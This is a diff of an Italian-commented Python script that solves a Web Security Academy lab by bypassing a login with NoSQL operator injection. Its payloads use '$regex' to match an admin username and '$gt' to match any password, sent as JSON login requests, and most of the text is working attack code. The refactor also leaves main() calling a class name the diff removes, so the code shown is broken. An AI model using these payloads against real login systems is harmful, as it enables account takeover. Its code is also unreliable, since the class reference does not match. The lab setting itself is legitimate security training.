@@ -6,83 +6,57 @@ import requests
 import sys
 import json
 from urllib.parse import urljoin
+from base_exploit import BaseNoSQLExploit, print_error, print_success, print_info
 
-try:
-    from colorama import init, Fore, Style
-    init(autoreset=True)
-except Exception:
-    class Fore:
-        RED = ''
-        GREEN = ''
-        YELLOW = ''
-        BLUE = ''
-        CYAN = ''
-        MAGENTA = ''
-    class Style:
-        RESET_ALL = ''
-
-def colored(text, color):
-    return f"{color}{text}{Style.RESET_ALL}"
-
-def print_error(msg):
-    print(colored(msg, Fore.RED))
-
-def print_success(msg):
-    print(colored(msg, Fore.GREEN))
-
-def print_info(msg):
-    print(colored(msg, Fore.CYAN))
-
-LAB_ID = "INSERT_YOUR_LAB_ID_HERE"  
+# ==================== CONFIGURAZIONE ====================
+LAB_ID = "INSERT_YOUR_LAB_ID_HERE"
 BASE_URL = f"https://{LAB_ID}.web-security-academy.net"
 
-class NoSQLInjectionExploit:
+# ==================== COSTANTI ====================
+SUCCESS_INDICATORS = ["My account", "Log out"]
+ADMIN_INDICATORS = ["administrator", "admin"]
+
+# ==================== EXPLOIT CLASS ====================
+class OperatorInjToBypassAuthentication(BaseNoSQLExploit):
+    """Exploit per NoSQL Injection Authentication Bypass."""
+    
     def __init__(self, lab_id):
-        self.lab_id = lab_id
-        self.base_url = f"https://{lab_id}.web-security-academy.net"
-        self.session = requests.Session()
-        
-    def check_lab_status(self):
-        try:
-            response = self.session.get(self.base_url, timeout=10)
-            if response.status_code == 200:
-                print_success(f"Lab raggiungibile: {self.base_url}")
-                return True
-            else:
-                print_error(f"Lab non raggiungibile (Status: {response.status_code})")
-                return False
-        except Exception as e:
-            print_error(f"Errore connessione: {e}")
+        super().__init__(lab_id)
+    
+    def _is_login_successful(self, response):
+        """Verifica se il login è riuscito analizzando la risposta."""
+        if response.status_code != 200:
             return False
+        return any(indicator in response.text for indicator in SUCCESS_INDICATORS)
+    
+    def _identify_logged_user(self, response_text):
+        """Identifica l'utente loggato dalla risposta."""
+        response_lower = response_text.lower()
+        if any(indicator in response_lower for indicator in ADMIN_INDICATORS):
+            return "ADMINISTRATOR"
+        elif "wiener" in response_lower:
+            return "wiener"
+        return "utente sconosciuto"
     
     def nosql_login(self, payload, description):
+        """Esegue un tentativo di login con payload NoSQL injection."""
         print_info(f"\n{description}")
         print(f"Payload: {json.dumps(payload, indent=2)}")
         
-        login_url = urljoin(self.base_url, "/login")
-        
-        headers = {
-            "Content-Type": "application/json"
-        }
-        
         try:
-            response = self.session.post(
-                login_url, 
-                json=payload, 
-                headers=headers,
-                allow_redirects=True
+            # Usa metodo della classe base
+            response = self.send_json_login(
+                username=payload.get("username"),
+                password=payload.get("password")
             )
             
-            if response.status_code == 200 and ("My account" in response.text or "Log out" in response.text):
+            if not response:
+                return False
+            
+            if self._is_login_successful(response):
                 print_success("\nLogin riuscito!")
-                
-                if "administrator" in response.text.lower() or "admin" in response.text.lower():
-                    print_success("Loggato come ADMINISTRATOR!")
-                elif "wiener" in response.text.lower():
-                    print_success("Loggato come utente 'wiener'")
-                else:
-                    print_success("Login completato")
-                
+                user = self._identify_logged_user(response.text)
+                print_success(f"Loggato come: {user}")
                 return True
             else:
                 print_error(f"Login fallito (Status: {response.status_code})")
@@ -93,11 +67,14 @@ class NoSQLInjectionExploit:
             return False
     
     def solve_lab(self):
-        """Risolve il lab con la sequenza corretta di exploit"""
+        """Risolve il lab con la sequenza corretta di exploit."""
         print("\n" + "="*60)
         print("SOLUZIONE LAB: NoSQL Injection Authentication Bypass")
         print("="*60)
         
+        # Payload che bypassa l'autenticazione:
+        # - $regex trova username che inizia con 'admin'
+        # - $gt confronta password con stringa vuota (sempre true)
         payload_admin = {
             "username": {"$regex": "admin.*"},
             "password": {"$gt": ""}
@@ -115,32 +92,34 @@ class NoSQLInjectionExploit:
             return False
     
     def explore_vulnerability(self):
+        """Esplora la vulnerabilità NoSQL injection con diversi approcci."""
         print("\n" + "="*60)
         print("ESPLORAZIONE VULNERABILITÀ")
         print("="*60)
 
+        # STEP 1: Username qualsiasi + password fissa
         print("\nSTEP 1 - Test: Bypass senza conoscere lo username")
         payload1 = {
-            "username": {"$gt": ""},
-            "password": "peter"
+            "username": {"$gt": ""},  # Qualsiasi username
+            "password": "peter"        # Password fissa
         }
         self.nosql_login(payload1, "Tentativo con $gt per username")
+        self.session = requests.Session()  # Reset sessione
         
-        self.session = requests.Session()
-        
+        # STEP 2: Username noto + password qualsiasi
         print("\nSTEP 2 - Test: Bypass conoscendo solo lo username")
         payload2 = {
-            "username": "wiener",
-            "password": {"$gt": ""}
+            "username": "wiener",       # Username noto
+            "password": {"$gt": ""}     # Qualsiasi password
         }
         self.nosql_login(payload2, "Tentativo con $gt per password")
+        self.session = requests.Session()  # Reset sessione
 
-        self.session = requests.Session()
-
-        print("\nSTEP 3 -Test: Login come administrator")
+        # STEP 3: Regex per admin + password qualsiasi
+        print("\nSTEP 3 - Test: Login come administrator")
         payload3 = {
-            "username": {"$regex": "admin.*"},
-            "password": {"$gt": ""}
+            "username": {"$regex": "admin.*"},  # Regex per trovare admin
+            "password": {"$gt": ""}             # Qualsiasi password
         }
         self.nosql_login(payload3, "Tentativo con regex per trovare admin")
     
@@ -165,29 +144,35 @@ class NoSQLInjectionExploit:
             return False
 
 def main():
-    if LAB_ID == "YOUR_LAB_ID_HERE":
-        print_error("\nERRORE: Devi impostare il LAB_ID nello script!")
-        print_info("Esempio: LAB_ID = '0a12003404bd3fe180f562b700ab0012'")
+    """Funzione principale per l'esecuzione dell'exploit."""
+    # Validazione configurazione
+    if not BaseNoSQLExploit.validate_lab_id(LAB_ID):
         sys.exit(1)
     
     exploit = NoSQLInjectionExploit(LAB_ID)
     
+    # Verifica connettività
     if not exploit.check_lab_status():
         sys.exit(1)
 
+    # Menu di scelta
     print("\nVuoi vedere l'esplorazione progressiva della vulnerabilità?")
-    print("    1 - Risolvi il lab")
-    print("    2 - Mostra esplorazione e risolvi ")
+    print("    1 - Risolvi direttamente il lab")
+    print("    2 - Mostra esplorazione step-by-step e poi risolvi")
     
     choice = input("\nScelta [1/2] (default=1): ").strip() or "1"
     
+    # Modalità esplorazione
     if choice == "2":
         exploit.explore_vulnerability()
         print("\n" + "="*60)
         print("Procedo con la soluzione finale...")
         print("="*60)
-        exploit.session = requests.Session()
+        # Reset sessione per soluzione pulita
+        exploit.session = exploit.session.__class__()
+        exploit.session.headers.update({"User-Agent": "Mozilla/5.0 (NoSQLi-Solver)"})
     
+    # Risoluzione lab
     if not exploit.solve_lab():
         sys.exit(1)
 
